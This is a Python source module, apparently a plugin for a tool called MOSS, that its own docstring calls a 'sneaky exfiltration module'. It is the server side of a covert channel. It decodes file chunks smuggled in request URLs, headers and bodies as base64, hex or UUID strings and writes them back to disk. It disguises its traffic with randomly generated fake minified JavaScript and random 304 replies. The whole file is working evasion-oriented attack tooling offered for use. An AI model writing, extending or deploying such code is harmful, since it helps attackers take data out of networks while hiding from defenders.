"""
ext/stealthnet.py

---

A sneaky exfiltration module to chunkify and siphon away bytes to MOSS. Define a
profile with a JSON DSL to customise your requests and byte-smuggling action.
The JSON will be understood by both the JS frontend (when sending requests) and
the Python backend (when parsing requests).

Due to the nature of this module, exfiltration is much slower compared to a
simple upload.

Sample profiles have been provided in the ext/stealthnet/profiles/ folder
(extensions for an extension!).
"""

from dataclasses import dataclass, field
import string
import sys
from pathlib import Path
import random
import base64
import binascii
import re
import json

GROUP = "stealthyupload (ext/stealthnet.py)"
MAX_CACHED_UPLOADED_FILE_SIZE = 100_000

def _field(default, group=None, doc="", metadata={}, flags=[], choices=[], **kwargs):
    """Simple wrapper to express fields more conveniently."""
    dwargs = {}
    if type(default).__name__ in ['function', 'type']:
        dwargs["default_factory"] = default
    else:
        dwargs["default"] = default
    return field(**dwargs, metadata=metadata | dict(group=group, doc=doc, flags=flags, choices=choices, **kwargs))

def load_file(path):
    with open(path, "rb") as f:
        return json.load(f)

@dataclass
class StealthyUploadMixin:
    stealth_path: str = _field("/upload", group=GROUP, doc="HTTP path which accepts upload payloads")
    stealth_profile_path: str = _field("profile.json", group=GROUP, flags=["--stealth-profile"], doc="The stealth profile to use")

    def __post_init__(self):
        self.uploaded_files = {}

        # Make sure file exists and is valid JSON.
        try:
            profile = self.load_profile(self.stealth_profile_path)
        except (FileNotFoundError, json.decoder.JSONDecodeError) as e:
            self.printerr(f"error loading profile: {e}")
            sys.exit(1)

        self.stealth_profile_str = json.dumps(profile).encode('utf-8')
        self.stealth_catalogue = make_catalogue_from_profile(profile)
        self.printstatus(f"Loaded profile '{self.stealth_profile_path}', {len(self.stealth_catalogue.requests)} requests")

        super().__post_init__()

    def load_profile(self, path):
        try:
            # Try relative path.
            return load_file(Path.cwd() / path)
        except FileNotFoundError:
            # Try default script path.
            return load_file(Path(__file__).parent / "stealthnet" / "profiles" / path)
            
    def list_uploaded_files(self):
        return list(self.uploaded_files)
    
    def get_uploaded_file(self, file):
        return self.uploaded_file.get(file, None)

class StealthyUploadProcessor:
    def do_GET(self, req):
        if req.path == "/favicon.ico":
            return req.send_response(404) # SHUTUP
        if not req.path.startswith(req.server.stealth_path):
            return self.handle_incoming_tx_request(req)
        
        if req.path == req.server.stealth_path:
            file = "index.html"
        else:
            file = req.path[len(req.server.stealth_path):].lstrip('/')
        
        folder = Path(__file__).parent / "stealthnet"
        path = folder / file
        try:
            if not path.resolve(True).is_relative_to(folder.resolve()):
                raise FileNotFoundError()
        except FileNotFoundError as e:
            return self.handle_incoming_tx_request(req)
        
        # TODO: cache index.{html,js} files and hide this dynamic loading behind a --stealth-debug flag
        with open(path, "rb") as f:
            content = f.read()
        
        if str(path).endswith('.js'):
            mime = 'text/javascript'
        else:
            mime = 'text/html'

        # TODO: encrypt the profile?
        content = content.replace(b"{{BASE_URL}}", req.server.stealth_path.encode())
        content = content.replace(b"{{PROFILE}}", req.server.stealth_profile_str)
        req.send_response(200, content=content, mime=mime)
        return True
    
    def handle_fallback(self, req):
        return self.handle_incoming_tx_request(req)
    
    def handle_incoming_tx_request(self, req):
        stealth = self.try_extract_payload(req)
        if stealth is None:
            return

        self.push_event(req, stealth=stealth)
        maxRetries = stealth.get("maxRetries", 0)
        if maxRetries > 0 and random.random() < 0.5:
            req.send_response(304)
            return True
        
        if req.path.endswith('.js'):
            # Randomly generate .js file.
            content = generate_fake_minified_js()
            req.send_response(200, content=content, mime='text/javascript')
        # elif ...
        # TODO: handle API calls --> return JSON
        else:
            req.send_response(200)

        return True
    
    
    def try_extract_payload(self, req):
        def try_call(f):
            try:
                return True, f()
            except JDSLProfileError as e:
                return False, e
        
        cat = req.server.stealth_catalogue
        try:
            # In case multiple matches exist, select the one which returns the
            # most bytes. The idea is that multiple matches arise due to vars,
            # which don't consume but don't return bytes.
            rs = cat.find(req)
            self.logger.info(f'{req.requestline} --> matches {len(rs)} / {rs[0]}')
            runs = [(conv[1], r) for r in rs if (conv := try_call(lambda: r.to_bytes(req)))[0]]
            
            if len(runs) >= 2:
                runs.sort(key=lambda x: -len(x[0]))
                self.logger.info(f'{len(runs)} runs: {[len(r[0]) for r in runs]}')
                self.logger.info(f'selected: {runs[0][1]}')
            
            bytes_ = runs[0][0]
            patterns = cat.match_patterns(req)
            return dict(bytes=bytes_, **patterns)
        except JDSLProfileError as e:
            self.logger.error(f"{e.__class__.__name__}: {e}")
        return None
    

DEFAULT_CHAR = b"_"
WHITELIST = (string.ascii_letters + string.digits + "_-.").encode()

def sanitise_filename(s: bytes | str) -> str:
    if type(s) == str:
        s = s.encode("utf-8")
    s = bytes([(c if c in WHITELIST else DEFAULT_CHAR) for c in s])
    return s.decode()


@dataclass
class StealthBytesEventHandler:
    stealth_upload_to: str = _field('dest', group=GROUP, doc="Store uploaded files in this directory")
    simple: bool = _field(False, group="logging", doc="Use simple logging, one line per event")
    # upload_max_size: int = _field(2 * 1024**3, group=GROUP, doc="Max file size accepted. Defaults to 2 GiB")

    def __post_init__(self):
        if self.stealth_upload_to and not (p := Path(self.stealth_upload_to)).exists():
            self.logger.warning(f"upload path did not exist, creating path... (mkdir {self.stealth_upload_to})")
            p.mkdir(parents=True, exist_ok=True)

    def handle_event(self, data):
        stealth = data.get("stealth", None)
        if not stealth:
            return
        
        self.log_to_display(**data, **stealth)
        self.handle_data(**stealth)
    
    def handle_data(self, filename, bytes, currentIndex, finalIndex, **_):
        filename = sanitise_filename(filename)
        file = Path(self.stealth_upload_to) / filename
        file.touch(exist_ok=True) 

        # Compute length based on indices, because bytes may be padded.
        length = finalIndex - currentIndex
        with open(file, "r+b") as f:
            f.seek(currentIndex)
            f.write(bytes[:length])

    def log_to_display(self, event_timestamp, client, filename, chunkNo, currentIndex, finalIndex, bytes, **_):
        c = self.c
        length = finalIndex - currentIndex
        if self.simple:
            self.printe(f"[{event_timestamp.split(' ')[-1]}] {c.GRN}STLTH{c.RST} [{client}] ~~>> {c.YLW}{length} bytes, #{chunkNo}, @{currentIndex}{c.RST} >> {filename}")
            return
        
        status = 'STEALTH'
        self.printe(f"{c.CYN}{status:><12}>{client:>>15}>>>{event_timestamp}{c.RST}")
        self.printe(f"{c.GRN}chunk #{chunkNo} / index @{currentIndex} / &>> {filename}{c.RST}")
        self.printe(f"{c.YLW}{bytes[:length][:40].decode(errors='ignore')}{c.RST}")
        self.printe(f"{c.CYN}{status:><30}{c.RST}\n")


VAR_REGEX = re.compile(r'(\$\{(?:var|uuid|b64|hex)(?::[a-zA-Z0-9]+)?(?::[0-9]+)?\})')

class Token:
    _capture = False

@dataclass
class LiteralToken(Token):
    literal: str
    _type = "literal"

    @property
    def _regex(self):
        return escape_regex(self.literal)

@dataclass
class VarToken(Token):
    _type = "var"
    _regex = r'.*'

@dataclass
class UuidToken(Token):
    _type = "uuid"
    _capture = True
    _regex = r'[0-9A-Fa-f\-]{36}'

    @classmethod
    def to_bytes(cls, s):
        return binascii.unhexlify(s.replace('-', ''))

@dataclass
class B64Token(Token):
    _type = "b64"
    _capture = True
    _regex = r'[A-Za-z0-9+/]+'

    @classmethod
    def to_bytes(cls, s):
        if type(s) == str:
            s = s.encode()
        return base64.b64decode(s + b'===')

@dataclass
class HexToken(Token):
    _type = "hex"
    _capture = True
    _regex = r'[0-9A-Fa-f]+'

    @classmethod
    def to_bytes(cls, s):
        return binascii.unhexlify(s)

def make_token(tag, *args):
    for cls in [VarToken, UuidToken, B64Token, HexToken]:
        if cls._type == tag:
            return cls()
    raise JDSLProfileError(f"unknown tag: {tag}({', '.join(args)})")

class JDSLProfileError(Exception): pass

def escape_regex(s):
    for c in '.(){}[]+*^$&!?':
        s = s.replace(c, '\\' + c)
    return s

class TokenString:
    def __init__(self, tokens):
        self.tokens = tokens

    @staticmethod
    def build(s):
        tokens = []
        splat = VAR_REGEX.split(s)
        for x in splat:
            if x.startswith('${'):
                tag, *args = x[2:-1].split(':')
                tok = make_token(tag, *args)
                if tokens and type(tok) == VarToken and (type(tokens[-1]) == VarToken or tok._capture):
                    # Prevent parsing difficulties later on.
                    raise JDSLProfileError(f"cannot have two VarTokens in a row (near {x})")
                tokens.append(tok)
            else:
                tokens.append(LiteralToken(x))
        return TokenString(tokens)
    
    def parse(self, string):
        original_string = string
        gentok = iter(self.tokens)
        try:
            while True:
                tok = next(gentok)
                regex = tok._regex
                if regex == '.*':
                    regex += '?' # Make it greedy.
                    # Grab the next token.
                    try:
                        tok2 = next(gentok)
                    except StopIteration:
                        # Well, it was going to match everything anyways, so I guess we're done!
                        return True
                    regex += tok2._regex
                
                # Match against the target.
                m = re.match('^' + regex, string)
                if m:
                    # Chop off the matched portion.
                    string = string[m.end():]
                else:
                    raise JDSLProfileError(f"failed to parse request for {tok} at {string}\ncontext: {original_string}\nregex: {regex}")
                
                if tok._capture:
                    try:
                        yield tok.to_bytes(m.group(0))
                    except Exception as e:
                        raise JDSLProfileError(f"error occurred while calling to_bytes on '{m.group(0)}': {e}")
        except StopIteration:
            return True # Done!
        
    def match(self, string):
        """Match an entire string against the preloaded tokens."""
        # Build an aggregated regex.
        regex = ''
        for tok in self.tokens:
            r = tok._regex
            if r == '.*':
                regex += r + '?' # greedy
            elif tok._capture:
                regex += f'({r})'
            else:
                regex += r
        
        m = re.match('^' + regex + '$', string)
        return m

class Request:
    def __init__(self, url, *, method="GET", headers=None, body="", **_):
        self.original = dict(url=url, method=method, headers=headers, body=body)
        self.url = TokenString.build(url)
        self.method = method
        ordered_headers = sorted(headers.items(), key=lambda t: t[0].lower())
        self.headers = {k.lower(): TokenString.build(v) for k, v in ordered_headers}
        self.body = TokenString.build(body)

    def match(self, req):
        """Attempt to match against an incoming request."""
        return self.method == req.command and self.url.match(req.path)
    
    def to_bytes(self, req):
        out = b''
        out += b''.join(self.url.parse(req.path))
        # The order of parsing headers is important. We base ordering on
        # alphabetical order. Don't rely on incoming headers as it could be
        # reordered by the browser or proxies.
        for k, h in self.headers.items():
            if v := req.headers.get(k.lower(), None):
                out += b''.join(h.parse(v))
        out += b''.join(self.body.parse(req.body.decode(errors='ignore')))
        return out
    
    def __str__(self):
        return f"Request({self.original['method']} {self.original['url']})"

class RequestCatalogue:
    def __init__(self, patterns):
        self.requests = []
        self.patterns = patterns

    def add_request(self, request):
        self.requests.append(Request(**request))

    def find(self, req):
        candidates = [r for r in self.requests if (m := r.match(req))]
        # if len(candidates) >= 2:
        #     candidates_str = "\n".join(str(r) for r, _ in candidates)
        #     raise JDSLProfileError(f"(confusion) the request could be matched in multiple ways:\nrequest: {req.requestline}\ncandidate matches: {candidates_str}")

        if not candidates:
            raise JDSLProfileError(f"could not find matching request for incoming request:\n{req.requestline}")
        
        return candidates
        
    def match_patterns(self, req):
        found = {}
        for pat in self.patterns:
            p = self.patterns[pat]
            type_ = p.get("type", None)
            if type_ == "header":
                hdr_name = p["name"]
                hdr_value = req.headers[hdr_name]
                if hdr_value is not None:
                    found[pat] = hdr_value
            else:
                raise JDSLProfileError(f"unknown pattern type: {type_}")
        if "fnRev" in found:
            found["filename"] = found["fnRev"][::-1]
        for x in ["chunkNo", "currentIndex", "finalIndex", "maxRetries"]:
            if x in found:
                found[x] = int(found[x])
        return found

        
def make_catalogue_from_profile(prof):
    rc = RequestCatalogue(prof["patterns"])
    # prof["common"] # TODO: handle headers parsed by common.headers
    for x in prof.get("intermittent", []):
        req = x["req"]
        rc.add_request(req)
    
    for x in prof.get("cycle", []):
        for req in x["req"]:
            rc.add_request(req)

    return rc



# ------------------------------------
# -- Random JS Generator
# ------------------------------------

import random
import string

IDENT_START = string.ascii_letters + "_$"
IDENT_CHAR  = IDENT_START + string.digits

KEYWORDS = {
    'break', 'case', 'catch', 'class', 'const', 'continue', 'debugger', 'default',
    'delete', 'do', 'else', 'export', 'extends', 'finally', 'for', 'function',
    'if', 'import', 'in', 'instanceof', 'new', 'return', 'super', 'switch',
    'this', 'throw', 'try', 'typeof', 'var', 'void', 'while', 'with', 'yield',
    'let', 'static', 'await', 'async'
}

def random_ident(len_range=(1,5)):
    length = random.randint(*len_range)
    first = random.choice(IDENT_START)
    rest = ''.join(random.choice(IDENT_CHAR) for _ in range(length-1))
    ident = first + rest
    while ident in KEYWORDS and random.random() < 0.85:
        ident = random_ident(len_range)
    return ident

def random_number():
    return random.choice([
        str(random.randint(-999,9999)),
        f"{random.randint(0,999)}.{random.randint(0,999)}",
        f"0x{random.randrange(0, 1<<32):x}",
        f".{random.randint(1,999)}",
        f"1e{random.choice(['','+','-'])}{random.randint(0,5)}",
        "NaN","Infinity","void 0"
    ])

def random_string():
    style = random.random()
    if style < 0.45:   # normal "
        return f'"{random_string_content()}"'
    elif style < 0.75: # normal '
        return f"'{random_string_content()}'"
    else:              # template-ish
        return f"`${{{random_ident()}}}`"

def random_string_content():
    chars = string.ascii_letters + string.digits + r""" !@#$%^&*()_+-=[]{}|;':",./<>?`~"""
    length = random.choices([0,1,2,3,4,5,6,7,8,10,12,16,24], weights=[1,4,7,10,12,10,8,6,5,4,3,2,1])[0]
    return ''.join(random.choice(chars) for _ in range(length))

def random_token():
    weights = [38, 16, 11, 9, 7, 6, 5, 4, 3, 1]
    choices = [
        lambda: random_ident((1,6)),                              # variables
        lambda: random_number(),
        lambda: random_string(),
        lambda: random.choice('.,;(){}[]?:'),
        lambda: random.choice('+-*/%&|^!~<>='),
        lambda: random.choice(['++','--','+=','-=','*=','/=','||','&&','==','===','!=','!==','<=','>=','=>','**','?.','??','??=']),
        lambda: random.choice(['true','false','null','undefined','this','NaN','Infinity','void 0']),
        lambda: random.choice(['function','return','if','else','for','while','do','switch','case','break','try','catch','finally','throw','new','delete','typeof','instanceof','in','of','await','async','class','extends','super','yield','import','export','default']),
        lambda: random.choice(['Math.','console.','JSON.','Object.','Array.','String.','Promise.','fetch(','document.','window.']),
        lambda: random.choice(['setTimeout(','setInterval(','addEventListener(','removeEventListener(']),
    ]
    return random.choices(choices, weights=weights, k=1)[0]()

def should_glue(prev, curr):
    if not prev: return False
    p, c = prev[-1], curr[0]

    # Very common no-space patterns in minified JS
    if p in '})].' and c in '([.':
        return True
    if p.isalnum() or p in '_$':
        if c.isalnum() or c in '_$':
            return True
    if p in '"\'' and c in '"\'':
        return False  # usually space between strings
    if curr in '.,;)}]':
        return True
    if prev in ['return','throw','new','delete','typeof','void','instanceof','in','of']:
        return False
    return random.random() < 0.72  # aggressive gluing

def generate_minified_js_lines(line_count=50, tokens_per_line=(6,40)):
    lines = []
    in_try_block = False

    for _ in range(line_count):
        tokens = []
        col = 0

        while col < 140 and len(tokens) < random.randint(*tokens_per_line):
            tok = random_token()

            if tokens and should_glue(tokens[-1], tok):
                pass  # no space
            elif random.random() < 0.18:
                tok = ' ' + tok

            tokens.append(tok)
            col += len(tok)

        line = ''.join(tokens)

        # occasional statement enders
        if random.random() < 0.28 and not line.endswith(('{','(','[')):
            line += random.choice([';',';',','])

        # try / catch coordination (very naive)
        r = random.random()
        if r < 0.04 and not in_try_block:
            line = "try{" + line
            in_try_block = True
        elif r < 0.08 and in_try_block:
            line += "}catch(" + random_ident((1,3)) + "){}"
            in_try_block = False

        lines.append(line)

    return lines

def generate_fake_minified_js():
    lines = generate_minified_js_lines(
        line_count = random.randint(40, 160),
        tokens_per_line = (5, 45)
    )

    # ────────────────────────────────────────
    #   Much more realistic header patterns
    # ────────────────────────────────────────
    header_patterns = [
        "(function(){",
        "!function(){",
        "(function(e,t,n){",
        "(function(a,b){return a*b})",
        "function(e,t){",
        "!function(t,e,n,o,i){",
        "(function(){return ",
        "var t,e,n,o,i;",
        "const e=t=>",
        "let $=document.getElementById(",
        "window.onload=function(){",
        '"use strict";',
        "Object.defineProperty(exports,'__esModule',{value:!0});",
        "define(['exports'],(function(exports){",
        "(function(global,factory){typeof exports==='object'&&typeof module!=='undefined'?factory(exports):",
        "(()=>{",
        "export default ",
        "(function(){var e=0;",
        "!function(e){e.exports=function(){",
    ]

    if random.random() < 0.8:
        lines.insert(0, random.choice(header_patterns))

    # Ending flourish (common in IIFEs and bundles)
    endings = [
        ";})();",
        "})();",
        "})();",
        "})(window);",
        "})(this);",
        "})(self);",
        "})(globalThis);",
        "})(typeof window!=='undefined'?window:this);",
    ]

    if random.random() < 0.65 and not lines[-1].strip().endswith('}'):
        lines[-1] = lines[-1].rstrip(';,') + random.choice(endings)

    return '\n'.join(lines)

# if __name__ == "__main__":
#     for _ in range(3):
#         print(generate_fake_minified_js())
#         print("\n" + "─"*70 + "\n")




